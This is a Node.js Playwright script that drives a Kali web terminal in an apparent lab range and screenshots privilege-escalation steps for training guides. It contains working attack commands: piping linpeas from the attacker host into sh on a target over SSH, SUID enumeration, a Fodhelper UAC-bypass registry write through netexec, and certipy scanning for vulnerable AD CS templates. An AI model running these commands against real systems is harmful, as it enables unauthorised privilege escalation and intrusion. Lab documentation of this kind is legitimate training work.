/**
 * capture-04-privilege-escalation.js
 * Credentials loaded from secrets/range.env
 * Note: linpeas/winpeas run on target via SSH/evil-winrm.
 * This script captures the Kali-side staging + command output.
 */

const { chromium } = require('playwright');
const path = require('path');
const fs   = require('fs');

const ENV_FILE = path.join(__dirname, '..', 'secrets', 'range.env');
if (!fs.existsSync(ENV_FILE)) { console.error('Missing secrets/range.env'); process.exit(1); }
const VARS = Object.fromEntries(
  fs.readFileSync(ENV_FILE, 'utf8').split('\n')
    .filter(l => l.includes('=') && !l.startsWith('#'))
    .map(l => { const [k, ...v] = l.split('='); return [k.trim(), v.join('=').trim()]; })
);

const KALI_TERMINAL = `http://${VARS.KALI_IP}:7681`;
const SHOTS_DIR     = path.join(__dirname, '..', 'guides', 'screenshots', '04-privilege-escalation');

function sub(cmd) { return cmd.replace(/<(\w+)>/g, (_, k) => VARS[k] ?? `<${k}>`); }
async function typeCmd(page, cmd) {
  await page.click('.xterm-helper-textarea, canvas, textarea').catch(() => {});
  await page.waitForTimeout(300);
  await page.keyboard.type(sub(cmd), { delay: 25 });
  await page.keyboard.press('Enter');
}
async function wait(page, ms) { await page.waitForTimeout(ms); }
async function shot(page, f) {
  await wait(page, 800);
  await page.screenshot({ path: path.join(SHOTS_DIR, f) });
  console.log(`  📸 ${f}`);
}
async function clear(page) { await typeCmd(page, 'clear'); await wait(page, 600); }

async function run() {
  fs.mkdirSync(SHOTS_DIR, { recursive: true });
  const browser = await chromium.launch({ headless: true });
  const page    = await (await browser.newContext()).newPage();
  await page.setViewportSize({ width: 1400, height: 820 });
  await page.goto(KALI_TERMINAL, { waitUntil: 'networkidle', timeout: 15000 });
  await wait(page, 2000);

  // ── 01: Serve linpeas from Kali (show staging step) ──────────────────────
  console.log('\n[1] Stage linpeas + run via SSH on Linux target...');
  await clear(page);
  await typeCmd(page, 'ls /usr/share/peass/linpeas/ 2>/dev/null || find / -name "linpeas.sh" 2>/dev/null | head -3');
  await wait(page, 10000);
  await shot(page, '01a-linpeas-stage.png');

  // Run linpeas on the Linux target via ssh and capture first screen of output
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "curl -s http://${VARS.KALI_IP}:8000/linpeas.sh 2>/dev/null | sh 2>/dev/null | head -60" 2>/dev/null`);
  await wait(page, 90000);
  await shot(page, '01-linpeas.png');

  // ── 02: SUID find on Linux ───────────────────────────────────────────────
  console.log('\n[2] SUID enumeration on Linux target...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "find / -perm -4000 -type f 2>/dev/null"`);
  await wait(page, 15000);
  await shot(page, '02-suid-enum.png');

  // ── 03: winpeas staging from Kali side ───────────────────────────────────
  console.log('\n[3] winpeas - show available binary...');
  await clear(page);
  await typeCmd(page, 'find / -name "winPEAS*" 2>/dev/null | head -5');
  await wait(page, 10000);
  await shot(page, '03-winpeas.png');

  // ── 04: Fodhelper via netexec ─────────────────────────────────────────────
  console.log('\n[4] Fodhelper UAC bypass via netexec...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "reg add \\"HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\\" /v DelegateExecute /t REG_SZ /d \\"\\" /f"');
  await wait(page, 15000);
  await shot(page, '04-fodhelper-uac.png');

  // ── 05: certipy find ─────────────────────────────────────────────────────
  console.log('\n[5] certipy find for AD CS...');
  await clear(page);
  await typeCmd(page, 'certipy find -u <USERNAME>@<DOMAIN> -p \'<PASSWORD>\' -dc-ip <DC_IP> -vulnerable -stdout 2>&1 | head -40');
  await wait(page, 60000);
  await shot(page, '05-certipy-esc1.png');

  await browser.close();
  console.log('\n✅ Privilege escalation screenshots done.');
}

run().catch(err => { console.error(err); process.exit(1); });
